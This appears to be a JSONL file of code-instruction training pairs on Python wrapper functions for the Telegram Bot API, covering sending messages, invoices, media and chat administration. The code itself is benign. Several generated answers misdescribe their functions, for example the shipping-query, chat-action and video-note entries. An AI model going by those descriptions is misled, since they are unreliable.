{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nuse this method to send text messages.", "response": "def send_message(token, chat_id, text, disable_web_page_preview=None, reply_to_message_id=None, reply_markup=None,\n                 parse_mode=None, disable_notification=None):\n    \"\"\"\n    Use this method to send text messages. On success, the sent Message is returned.\n    :param token:\n    :param chat_id:\n    :param text:\n    :param disable_web_page_preview:\n    :param reply_to_message_id:\n    :param reply_markup:\n    :param parse_mode:\n    :param disable_notification:\n    :return:\n    \"\"\"\n    method_url = r'sendMessage'\n    payload = {'chat_id': str(chat_id), 'text': text}\n    if disable_web_page_preview:\n        payload['disable_web_page_preview'] = disable_web_page_preview\n    if reply_to_message_id:\n        payload['reply_to_message_id'] = reply_to_message_id\n    if reply_markup:\n        payload['reply_markup'] = _convert_markup(reply_markup)\n    if parse_mode:\n        payload['parse_mode'] = parse_mode\n    if disable_notification:\n        payload['disable_notification'] = disable_notification\n    return _make_request(token, method_url, params=payload, method='post')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nuse this method to set the score of a user in a game.", "response": "def set_game_score(token, user_id, score, force=None, disable_edit_message=None, chat_id=None, message_id=None,\n                   inline_message_id=None):\n    \"\"\"\n    Use this method to set the score of the specified user in a game. On success, if the message was sent by the bot, returns the edited Message, otherwise returns True. Returns an error, if the new score is not greater than the user's current score in the chat.\n    :param token: Bot's token (you don't need to fill this)\n    :param user_id: User identifier\n    :param score: New score, must be non-negative\n    :param force: (Optional) Pass True, if the high score is allowed to decrease. This can be useful when fixing mistakes or banning cheaters\n    :param disable_edit_message: (Optional) Pass True, if the game message should not be automatically edited to include the current scoreboard\n    :param chat_id: (Optional, required if inline_message_id is not specified) Unique identifier for the target chat (or username of the target channel in the format @channelusername)\n    :param message_id: (Optional, required if inline_message_id is not specified) Unique identifier of the sent message\n    :param inline_message_id: (Optional, required if chat_id and message_id are not specified) Identifier of the inline message\n    :return:\n    \"\"\"\n    method_url = r'setGameScore'\n    payload = {'user_id': user_id, 'score': score}\n    if force:\n        payload['force'] = force\n    if chat_id:\n        payload['chat_id'] = chat_id\n    if message_id:\n        payload['message_id'] = message_id\n    if inline_message_id:\n        payload['inline_message_id'] = inline_message_id\n    if disable_edit_message:\n        payload['disable_edit_message'] = disable_edit_message\n    return _make_request(token, method_url, params=payload)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses this method to get data for high score tables. Will return the score of the specified user and several of his neighbors in a game. On success, returns an Array of GameHighScore objects. This method will currently return scores for the target user, plus two of his closest neighbors on each side. Will also return the top three users if the user and his neighbors are not among them. Please note that this behavior is subject to change. :param token: Bot's token (you don't need to fill this) :param user_id: Target user id :param chat_id: (Optional, required if inline_message_id is not specified) Unique identifier for the target chat (or username of the target channel in the format @channelusername) :param message_id: (Optional, required if inline_message_id is not specified) Unique identifier of the sent message :param inline_message_id: (Optional, required if chat_id and message_id are not specified) Identifier of the inline message :return:", "response": "def get_game_high_scores(token, user_id, chat_id=None, message_id=None, inline_message_id=None):\n    \"\"\"\n    Use this method to get data for high score tables. Will return the score of the specified user and several of his neighbors in a game. On success, returns an Array of GameHighScore objects.\n    This method will currently return scores for the target user, plus two of his closest neighbors on each side. Will also return the top three users if the user and his neighbors are not among them. Please note that this behavior is subject to change.\n    :param token: Bot's token (you don't need to fill this)\n    :param user_id: Target user id\n    :param chat_id: (Optional, required if inline_message_id is not specified) Unique identifier for the target chat (or username of the target channel in the format @channelusername)\n    :param message_id: (Optional, required if inline_message_id is not specified) Unique identifier of the sent message\n    :param inline_message_id: (Optional, required if chat_id and message_id are not specified) Identifier of the inline message\n    :return:\n    \"\"\"\n    method_url = r'getGameHighScores'\n    payload = {'user_id': user_id}\n    if chat_id:\n        payload['chat_id'] = chat_id\n    if message_id:\n        payload['message_id'] = message_id\n    if inline_message_id:\n        payload['inline_message_id'] = inline_message_id\n    return _make_request(token, method_url, params=payload)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nusing this method to send invoices. On success, the sent Message is returned. :param token: Bot's token (you don't need to fill this) :param chat_id: Unique identifier for the target private chat :param title: Product name :param description: Product description :param invoice_payload: Bot-defined invoice payload, 1-128 bytes. This will not be displayed to the user, use for your internal processes. :param provider_token: Payments provider token, obtained via @Botfather :param currency: Three-letter ISO 4217 currency code, see https://core.telegram.org/bots/payments#supported-currencies :param prices: Price breakdown, a list of components (e.g. product price, tax, discount, delivery cost, delivery tax, bonus, etc.) :param start_parameter: Unique deep-linking parameter that can be used to generate this invoice when used as a start parameter :param photo_url: URL of the product photo for the invoice. Can be a photo of the goods or a marketing image for a service. People like it better when they see what they are paying for. :param photo_size: Photo size :param photo_width: Photo width :param photo_height: Photo height :param need_name: Pass True, if you require the user's full name to complete the order :param need_phone_number: Pass True, if you require the user's phone number to complete the order :param need_email: Pass True, if you require the user's email to complete the order :param need_shipping_address: Pass True, if you require the user's shipping address to complete the order :param is_flexible: Pass True, if the final price depends on the shipping method :param disable_notification: Sends the message silently. Users will receive a notification with no sound. :param reply_to_message_id: If the message is a reply, ID of the original message :param reply_markup: A JSON-serialized object for an inline keyboard. If empty, one 'Pay total price' button will be shown. If not empty, the first button must be a Pay button :param provider_data: :return:", "response": "def send_invoice(token, chat_id, title, description, invoice_payload, provider_token, currency, prices,\n                 start_parameter, photo_url=None, photo_size=None, photo_width=None, photo_height=None,\n                 need_name=None, need_phone_number=None, need_email=None, need_shipping_address=None, is_flexible=None,\n                 disable_notification=None, reply_to_message_id=None, reply_markup=None, provider_data=None):\n    \"\"\"\n    Use this method to send invoices. On success, the sent Message is returned.\n    :param token: Bot's token (you don't need to fill this)\n    :param chat_id: Unique identifier for the target private chat\n    :param title: Product name\n    :param description: Product description\n    :param invoice_payload: Bot-defined invoice payload, 1-128 bytes. This will not be displayed to the user, use for your internal processes.\n    :param provider_token: Payments provider token, obtained via @Botfather\n    :param currency: Three-letter ISO 4217 currency code, see https://core.telegram.org/bots/payments#supported-currencies\n    :param prices: Price breakdown, a list of components (e.g. product price, tax, discount, delivery cost, delivery tax, bonus, etc.)\n    :param start_parameter: Unique deep-linking parameter that can be used to generate this invoice when used as a start parameter\n    :param photo_url: URL of the product photo for the invoice. Can be a photo of the goods or a marketing image for a service. People like it better when they see what they are paying for.\n    :param photo_size: Photo size\n    :param photo_width: Photo width\n    :param photo_height: Photo height\n    :param need_name: Pass True, if you require the user's full name to complete the order\n    :param need_phone_number: Pass True, if you require the user's phone number to complete the order\n    :param need_email: Pass True, if you require the user's email to complete the order\n    :param need_shipping_address: Pass True, if you require the user's shipping address to complete the order\n    :param is_flexible: Pass True, if the final price depends on the shipping method\n    :param disable_notification: Sends the message silently. Users will receive a notification with no sound.\n    :param reply_to_message_id: If the message is a reply, ID of the original message\n    :param reply_markup: A JSON-serialized object for an inline keyboard. If empty, one 'Pay total price' button will be shown. If not empty, the first button must be a Pay button\n    :param provider_data:\n    :return:\n    \"\"\"\n    method_url = r'sendInvoice'\n    payload = {'chat_id': chat_id, 'title': title, 'description': description, 'payload': invoice_payload,\n               'provider_token': provider_token, 'start_parameter': start_parameter, 'currency': currency,\n               'prices': _convert_list_json_serializable(prices)}\n    if photo_url:\n        payload['photo_url'] = photo_url\n    if photo_size:\n        payload['photo_size'] = photo_size\n    if photo_width:\n        payload['photo_width'] = photo_width\n    if photo_height:\n        payload['photo_height'] = photo_height\n    if need_name:\n        payload['need_name'] = need_name\n    if need_phone_number:\n        payload['need_phone_number'] = need_phone_number\n    if need_email:\n        payload['need_email'] = need_email\n    if need_shipping_address:\n        payload['need_shipping_address'] = need_shipping_address\n    if is_flexible:\n        payload['is_flexible'] = is_flexible\n    if disable_notification:\n        payload['disable_notification'] = disable_notification\n    if reply_to_message_id:\n        payload['reply_to_message_id'] = reply_to_message_id\n    if reply_markup:\n        payload['reply_markup'] = _convert_markup(reply_markup)\n    if provider_data:\n        payload['provider_data'] = provider_data\n    return _make_request(token, method_url, params=payload)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef answer_shipping_query(token, shipping_query_id, ok, shipping_options=None, error_message=None):\n    method_url = 'answerShippingQuery'\n    payload = {'shipping_query_id': shipping_query_id, 'ok': ok}\n    if shipping_options:\n        payload['shipping_options'] = _convert_list_json_serializable(shipping_options)\n    if error_message:\n        payload['error_message'] = error_message\n    return _make_request(token, method_url, params=payload)", "response": "This method sends an invoice request to a shipping address."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nusing this method to send answers to callback queries sent from inline keyboards. The answer will be displayed to the user as a notification at the top of the chat screen or as an alert. On success, True is returned. Alternatively, the user can be redirected to the specified Game URL. For this option to work, you must first create a game for your bot via BotFather and accept the terms. Otherwise, you may use links like telegram.me/your_bot?start=XXXX that open your bot with a parameter. :param token: Bot's token (you don't need to fill this) :param callback_query_id: Unique identifier for the query to be answered :param text: (Optional) Text of the notification. If not specified, nothing will be shown to the user, 0-200 characters :param show_alert: (Optional) If true, an alert will be shown by the client instead of a notification at the top of the chat screen. Defaults to false. :param url: (Optional) URL that will be opened by the user's client. If you have created a Game and accepted the conditions via @Botfather, specify the URL that opens your game \u2013 note that this will only work if the query comes from a callback_game button. Otherwise, you may use links like telegram.me/your_bot?start=XXXX that open your bot with a parameter. :param cache_time: (Optional) The maximum amount of time in seconds that the result of the callback query may be cached client-side. Telegram apps will support caching starting in version 3.14. Defaults to 0. :return:", "response": "def answer_callback_query(token, callback_query_id, text=None, show_alert=None, url=None, cache_time=None):\n    \"\"\"\n    Use this method to send answers to callback queries sent from inline keyboards. The answer will be displayed to the user as a notification at the top of the chat screen or as an alert. On success, True is returned.\n    Alternatively, the user can be redirected to the specified Game URL. For this option to work, you must first create a game for your bot via BotFather and accept the terms. Otherwise, you may use links like telegram.me/your_bot?start=XXXX that open your bot with a parameter.\n    :param token: Bot's token (you don't need to fill this)\n    :param callback_query_id: Unique identifier for the query to be answered\n    :param text: (Optional) Text of the notification. If not specified, nothing will be shown to the user, 0-200 characters\n    :param show_alert: (Optional) If true, an alert will be shown by the client instead of a notification at the top of the chat screen. Defaults to false.\n    :param url: (Optional) URL that will be opened by the user's client. If you have created a Game and accepted the conditions via @Botfather, specify the URL that opens your game \u2013 note that this will only work if the query comes from a callback_game button.\n    Otherwise, you may use links like telegram.me/your_bot?start=XXXX that open your bot with a parameter.\n    :param cache_time: (Optional) The maximum amount of time in seconds that the result of the callback query may be cached client-side. Telegram apps will support caching starting in version 3.14. Defaults to 0.\n    :return:\n    \"\"\"\n    method_url = 'answerCallbackQuery'\n    payload = {'callback_query_id': callback_query_id}\n    if text:\n        payload['text'] = text\n    if show_alert:\n        payload['show_alert'] = show_alert\n    if url:\n        payload['url'] = url\n    if cache_time is not None:\n        payload['cache_time'] = cache_time\n    return _make_request(token, method_url, params=payload, method='post')"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef enable_save_next_step_handlers(self, delay=120, filename=\"./.handler-saves/step.save\"):\n        self.next_step_saver = Saver(self.next_step_handlers, filename, delay)", "response": "Enable saving next step handlers"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef enable_save_reply_handlers(self, delay=120, filename=\"./.handler-saves/reply.save\"):\n        self.reply_saver = Saver(self.reply_handlers, filename, delay)", "response": "Enable saving reply handlers for the current node."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nloads next step handlers from save file", "response": "def load_next_step_handlers(self, filename=\"./.handler-saves/step.save\", del_file_after_loading=True):\n        \"\"\"\n        Load next step handlers from save file\n\n        :param filename: Filename of the file where handlers was saved\n        :param del_file_after_loading: Is passed True, after loading save file will be deleted\n        \"\"\"\n        self.next_step_saver.load_handlers(filename, del_file_after_loading)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nuse this method to receive incoming updates using long polling (wiki). An Array of Update objects is returned. :param allowed_updates: Array of string. List the types of updates you want your bot to receive. :param offset: Integer. Identifier of the first update to be returned. :param limit: Integer. Limits the number of updates to be retrieved. :param timeout: Integer. Timeout in seconds for long polling. :return: array of Updates", "response": "def get_updates(self, offset=None, limit=None, timeout=20, allowed_updates=None):\n        \"\"\"\n        Use this method to receive incoming updates using long polling (wiki). An Array of Update objects is returned.\n        :param allowed_updates: Array of string. List the types of updates you want your bot to receive.\n        :param offset: Integer. Identifier of the first update to be returned.\n        :param limit: Integer. Limits the number of updates to be retrieved.\n        :param timeout: Integer. Timeout in seconds for long polling.\n        :return: array of Updates\n        \"\"\"\n        json_updates = apihelper.get_updates(self.token, offset, limit, timeout, allowed_updates)\n        ret = []\n        for ju in json_updates:\n            ret.append(types.Update.de_json(ju))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets and discard all pending updates before first poll of the bot", "response": "def __skip_updates(self):\n        \"\"\"\n        Get and discard all pending updates before first poll of the bot\n        :return: total updates skipped\n        \"\"\"\n        total = 0\n        updates = self.get_updates(offset=self.last_update_id, timeout=1)\n        while updates:\n            total += len(updates)\n            for update in updates:\n                if update.update_id > self.last_update_id:\n                    self.last_update_id = update.update_id\n            updates = self.get_updates(offset=self.last_update_id + 1, timeout=1)\n        return total"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef __retrieve_updates(self, timeout=20):\n        if self.skip_pending:\n            logger.debug('Skipped {0} pending messages'.format(self.__skip_updates()))\n            self.skip_pending = False\n        updates = self.get_updates(offset=(self.last_update_id + 1), timeout=timeout)\n        self.process_new_updates(updates)", "response": "Retrieve any updates from Telegram API."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_user_profile_photos(self, user_id, offset=None, limit=None):\n        result = apihelper.get_user_profile_photos(self.token, user_id, offset, limit)\n        return types.UserProfilePhotos.de_json(result)", "response": "Get the user profile photos of the person with user_id."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nuse this method to get up to date information about a chat.", "response": "def get_chat(self, chat_id):\n        \"\"\"\n        Use this method to get up to date information about the chat (current name of the user for one-on-one\n        conversations, current username of a user, group or channel, etc.). Returns a Chat object on success.\n        :param chat_id:\n        :return:\n        \"\"\"\n        result = apihelper.get_chat(self.token, chat_id)\n        return types.Chat.de_json(result)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef leave_chat(self, chat_id):\n        result = apihelper.leave_chat(self.token, chat_id)\n        return result", "response": "Use this method to leave a chat. Returns True on success."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nuse this method to get a list of administrators in a chat. On success returns an Array of ChatMember objects containing information about all administrators except other bots.", "response": "def get_chat_administrators(self, chat_id):\n        \"\"\"\n        Use this method to get a list of administrators in a chat. On success, returns an Array of ChatMember objects\n        that contains information about all chat administrators except other bots.\n        :param chat_id:\n        :return:\n        \"\"\"\n        result = apihelper.get_chat_administrators(self.token, chat_id)\n        ret = []\n        for r in result:\n            ret.append(types.ChatMember.de_json(r))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_chat_members_count(self, chat_id):\n        result = apihelper.get_chat_members_count(self.token, chat_id)\n        return result", "response": "Use this method to get the number of members in a chat. Returns Int on success."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nusing this method to set a new group sticker set for a supergroup chat.", "response": "def set_chat_sticker_set(self, chat_id, sticker_set_name):\n        \"\"\"\n        Use this method to set a new group sticker set for a supergroup. The bot must be an administrator\n        in the chat for this to work and must have the appropriate admin rights.\n        Use the field can_set_sticker_set optionally returned in getChat requests to check\n        if the bot can use this method. Returns True on success.\n        :param chat_id: Unique identifier for the target chat or username of the target supergroup\n        (in the format @supergroupusername)\n        :param sticker_set_name: Name of the sticker set to be set as the group sticker set\n        :return:\n        \"\"\"\n        result = apihelper.set_chat_sticker_set(self.token, chat_id, sticker_set_name)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef delete_chat_sticker_set(self, chat_id):\n        result = apihelper.delete_chat_sticker_set(self.token, chat_id)\n        return result", "response": "Use this method to delete a group sticker set from a supergroup chat."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing this method to get information about a member of a chat. Returns a ChatMember object on success.", "response": "def get_chat_member(self, chat_id, user_id):\n        \"\"\"\n        Use this method to get information about a member of a chat. Returns a ChatMember object on success.\n        :param chat_id:\n        :param user_id:\n        :return:\n        \"\"\"\n        result = apihelper.get_chat_member(self.token, chat_id, user_id)\n        return types.ChatMember.de_json(result)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef send_message(self, chat_id, text, disable_web_page_preview=None, reply_to_message_id=None, reply_markup=None,\n                     parse_mode=None, disable_notification=None):\n        \"\"\"\n        Use this method to send text messages.\n\n        Warning: Do not send more than about 5000 characters each message, otherwise you'll risk an HTTP 414 error.\n        If you must send more than 5000 characters, use the split_string function in apihelper.py.\n\n        :param chat_id:\n        :param text:\n        :param disable_web_page_preview:\n        :param reply_to_message_id:\n        :param reply_markup:\n        :param parse_mode:\n        :param disable_notification: Boolean, Optional. Sends the message silently.\n        :return: API reply.\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_message(self.token, chat_id, text, disable_web_page_preview, reply_to_message_id,\n                                   reply_markup, parse_mode, disable_notification))", "response": "Use this method to send text messages. You can use this method to send text messages. You can use the split_string function in apihelper. py."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef forward_message(self, chat_id, from_chat_id, message_id, disable_notification=None):\n        return types.Message.de_json(\n            apihelper.forward_message(self.token, chat_id, from_chat_id, message_id, disable_notification))", "response": "Use this method to forward a message from one chat to another."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nuses this method to delete a message from a chat. Returns True on success.", "response": "def delete_message(self, chat_id, message_id):\n        \"\"\"\n        Use this method to delete message. Returns True on success.\n        :param chat_id: in which chat to delete\n        :param message_id: which message to delete\n        :return: API reply.\n        \"\"\"\n        return apihelper.delete_message(self.token, chat_id, message_id)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing this method to send photos.", "response": "def send_photo(self, chat_id, photo, caption=None, reply_to_message_id=None, reply_markup=None,\n                   parse_mode=None, disable_notification=None):\n        \"\"\"\n        Use this method to send photos.\n        :param disable_notification:\n        :param chat_id:\n        :param photo:\n        :param caption:\n        :param parse_mode\n        :param reply_to_message_id:\n        :param reply_markup:\n        :return: API reply.\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_photo(self.token, chat_id, photo, caption, reply_to_message_id, reply_markup,\n                                 parse_mode, disable_notification))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nusing this method to send audio files. You must be an administrator in the chat for this to work and must have the appropriate admin rights.", "response": "def send_audio(self, chat_id, audio, caption=None, duration=None, performer=None, title=None,\n                   reply_to_message_id=None, reply_markup=None, parse_mode=None, disable_notification=None,\n                   timeout=None):\n        \"\"\"\n        Use this method to send audio files, if you want Telegram clients to display them in the music player. Your audio must be in the .mp3 format.\n        :param chat_id:Unique identifier for the message recipient\n        :param audio:Audio file to send.\n        :param duration:Duration of the audio in seconds\n        :param performer:Performer\n        :param title:Track name\n        :param parse_mode\n        :param reply_to_message_id:If the message is a reply, ID of the original message\n        :param reply_markup:\n        :return: Message\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_audio(self.token, chat_id, audio, caption, duration, performer, title, reply_to_message_id,\n                                 reply_markup, parse_mode, disable_notification, timeout))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses this method to send a document.", "response": "def send_document(self, chat_id, data, reply_to_message_id=None, caption=None, reply_markup=None,\n                      parse_mode=None, disable_notification=None, timeout=None):\n        \"\"\"\n        Use this method to send general files.\n        :param chat_id:\n        :param data:\n        :param reply_to_message_id:\n        :param reply_markup:\n        :param parse_mode:\n        :param disable_notification:\n        :return: API reply.\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_data(self.token, chat_id, data, 'document', reply_to_message_id, reply_markup,\n                                parse_mode, disable_notification, timeout, caption=caption))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses this method to send a sticker.", "response": "def send_sticker(self, chat_id, data, reply_to_message_id=None, reply_markup=None, disable_notification=None,\n                     timeout=None):\n        \"\"\"\n        Use this method to send .webp stickers.\n        :param chat_id:\n        :param data:\n        :param reply_to_message_id:\n        :param reply_markup:\n        :return: API reply.\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_data(self.token, chat_id, data, 'sticker', reply_to_message_id, reply_markup,\n                                disable_notification, timeout))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nuses this method to send a video note. You can use this method to send video files. You can use the video files Telegram clients can use the mp4 videos API.", "response": "def send_video_note(self, chat_id, data, duration=None, length=None, reply_to_message_id=None, reply_markup=None,\n                        disable_notification=None, timeout=None):\n        \"\"\"\n        Use this method to send video files, Telegram clients support mp4 videos.\n        :param chat_id: Integer : Unique identifier for the message recipient \u2014 User or GroupChat id\n        :param data: InputFile or String : Video note to send. You can either pass a file_id as String to resend a video that is already on the Telegram server\n        :param duration: Integer : Duration of sent video in seconds\n        :param length: Integer : Video width and height, Can't be None and should be in range of (0, 640)\n        :param reply_to_message_id:\n        :param reply_markup:\n        :return:\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_video_note(self.token, chat_id, data, duration, length, reply_to_message_id, reply_markup,\n                                      disable_notification, timeout))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nuses this method to send a group of photos or videos as an album. You must be an administrator in the chat for this to work and must have the appropriate admin rights.", "response": "def send_media_group(self, chat_id, media, disable_notification=None, reply_to_message_id=None):\n        \"\"\"\n        send a group of photos or videos as an album. On success, an array of the sent Messages is returned.\n        :param chat_id:\n        :param media:\n        :param disable_notification:\n        :param reply_to_message_id:\n        :return:\n        \"\"\"\n        result = apihelper.send_media_group(self.token, chat_id, media, disable_notification, reply_to_message_id)\n        ret = []\n        for msg in result:\n            ret.append(types.Message.de_json(msg))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef send_location(self, chat_id, latitude, longitude, live_period=None, reply_to_message_id=None, reply_markup=None,\n                      disable_notification=None):\n        \"\"\"\n        Use this method to send point on the map.\n        :param chat_id:\n        :param latitude:\n        :param longitude:\n        :param live_period\n        :param reply_to_message_id:\n        :param reply_markup:\n        :return: API reply.\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_location(self.token, chat_id, latitude, longitude, live_period, reply_to_message_id,\n                                    reply_markup,\n                                    disable_notification))", "response": "Use this method to send location on the map."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef edit_message_live_location(self, latitude, longitude, chat_id=None, message_id=None,\n                                   inline_message_id=None, reply_markup=None):\n        \"\"\"\n        Use this method to edit live location\n        :param latitude:\n        :param longitude:\n        :param chat_id:\n        :param message_id:\n        :param inline_message_id:\n        :param reply_markup:\n        :return:\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.edit_message_live_location(self.token, latitude, longitude, chat_id, message_id,\n                                                 inline_message_id, reply_markup))", "response": "Use this method to edit live location of a message."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses this method to stop updating a live location message.", "response": "def stop_message_live_location(self, chat_id=None, message_id=None, inline_message_id=None, reply_markup=None):\n        \"\"\"\n        Use this method to stop updating a live location message sent by the bot\n        or via the bot (for inline bots) before live_period expires\n        :param chat_id:\n        :param message_id:\n        :param inline_message_id:\n        :param reply_markup:\n        :return:\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.stop_message_live_location(self.token, chat_id, message_id, inline_message_id, reply_markup))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nuse this method to send information about a venue.", "response": "def send_venue(self, chat_id, latitude, longitude, title, address, foursquare_id=None, disable_notification=None,\n                   reply_to_message_id=None, reply_markup=None):\n        \"\"\"\n        Use this method to send information about a venue.\n        :param chat_id: Integer or String : Unique identifier for the target chat or username of the target channel\n        :param latitude: Float : Latitude of the venue\n        :param longitude: Float : Longitude of the venue\n        :param title: String : Name of the venue\n        :param address: String : Address of the venue\n        :param foursquare_id: String : Foursquare identifier of the venue\n        :param disable_notification:\n        :param reply_to_message_id:\n        :param reply_markup:\n        :return:\n        \"\"\"\n        return types.Message.de_json(\n            apihelper.send_venue(self.token, chat_id, latitude, longitude, title, address, foursquare_id,\n                                 disable_notification, reply_to_message_id, reply_markup)\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef send_chat_action(self, chat_id, action):\n        return apihelper.send_chat_action(self.token, chat_id, action)", "response": "Use this method when you want to send a message to a chat."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef kick_chat_member(self, chat_id, user_id, until_date=None):\n        return apihelper.kick_chat_member(self.token, chat_id, user_id, until_date)", "response": "Use this method to kick a user from a chat."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nuses this method to restrict a user in a supergroup.", "response": "def restrict_chat_member(self, chat_id, user_id, until_date=None, can_send_messages=None,\n                             can_send_media_messages=None, can_send_other_messages=None,\n                             can_add_web_page_previews=None):\n        \"\"\"\n        Use this method to restrict a user in a supergroup.\n        The bot must be an administrator in the supergroup for this to work and must have\n        the appropriate admin rights. Pass True for all boolean parameters to lift restrictions from a user.\n        Returns True on success.\n        :param chat_id: Int or String : \tUnique identifier for the target group or username of the target supergroup\n            or channel (in the format @channelusername)\n        :param user_id: Int : Unique identifier of the target user\n        :param until_date: Date when restrictions will be lifted for the user, unix time.\n            If user is restricted for more than 366 days or less than 30 seconds from the current time,\n            they are considered to be restricted forever\n        :param can_send_messages: Pass True, if the user can send text messages, contacts, locations and venues\n        :param can_send_media_messages Pass True, if the user can send audios, documents, photos, videos, video notes\n            and voice notes, implies can_send_messages\n        :param can_send_other_messages: Pass True, if the user can send animations, games, stickers and\n            use inline bots, implies can_send_media_messages\n        :param can_add_web_page_previews: Pass True, if the user may add web page previews to their messages,\n            implies can_send_media_messages\n        :return: types.Message\n        \"\"\"\n        return apihelper.restrict_chat_member(self.token, chat_id, user_id, until_date, can_send_messages,\n                                              can_send_media_messages, can_send_other_messages,\n                                              can_add_web_page_previews)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\npromotes a user in a supergroup or a channel.", "response": "def promote_chat_member(self, chat_id, user_id, can_change_info=None, can_post_messages=None,\n                            can_edit_messages=None, can_delete_messages=None, can_invite_users=None,\n                            can_restrict_members=None, can_pin_messages=None, can_promote_members=None):\n        \"\"\"\n        Use this method to promote or demote a user in a supergroup or a channel. The bot must be an administrator\n        in the chat for this to work and must have the appropriate admin rights.\n        Pass False for all boolean parameters to demote a user. Returns True on success.\n        :param chat_id: Unique identifier for the target chat or username of the target channel (\n            in the format @channelusername)\n        :param user_id: Int : Unique identifier of the target user\n        :param can_change_info: Bool: Pass True, if the administrator can change chat title, photo and other settings\n        :param can_post_messages: Bool : Pass True, if the administrator can create channel posts, channels only\n        :param can_edit_messages: Bool : Pass True, if the administrator can edit messages of other users, channels only\n        :param can_delete_messages: Bool : Pass True, if the administrator can delete messages of other users\n        :param can_invite_users: Bool : Pass True, if the administrator can invite new users to the chat\n        :param can_restrict_members: Bool: Pass True, if the administrator can restrict, ban or unban chat members\n        :param can_pin_messages: Bool: Pass True, if the administrator can pin messages, supergroups only\n        :param can_promote_members: Bool: Pass True, if the administrator can add new administrators with a subset\n            of his own privileges or demote administrators that he has promoted, directly or indirectly\n            (promoted by administrators that were appointed by him)\n        :return:\n        \"\"\"\n        return apihelper.promote_chat_member(self.token, chat_id, user_id, can_change_info, can_post_messages,\n                                             can_edit_messages, can_delete_messages, can_invite_users,\n                                             can_restrict_members, can_pin_messages, can_promote_members)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_chat_photo(self, chat_id, photo):\n        return apihelper.set_chat_photo(self.token, chat_id, photo)", "response": "Use this method to set a new profile photo for a chat. Photos can t be changed for private chats."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_chat_title(self, chat_id, title):\n        return apihelper.set_chat_title(self.token, chat_id, title)", "response": "Use this method to change the title of a chat."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_chat_description(self, chat_id, description):\n        return apihelper.set_chat_description(self.token, chat_id, description)", "response": "Use this method to change the chat description"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef pin_chat_message(self, chat_id, message_id, disable_notification=False):\n        return apihelper.pin_chat_message(self.token, chat_id, message_id, disable_notification)", "response": "Use this method to pin a message in a supergroup."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef reply_to(self, message, text, **kwargs):\n        return self.send_message(message.chat.id, text, reply_to_message_id=message.message_id, **kwargs)", "response": "Reply to a message."}
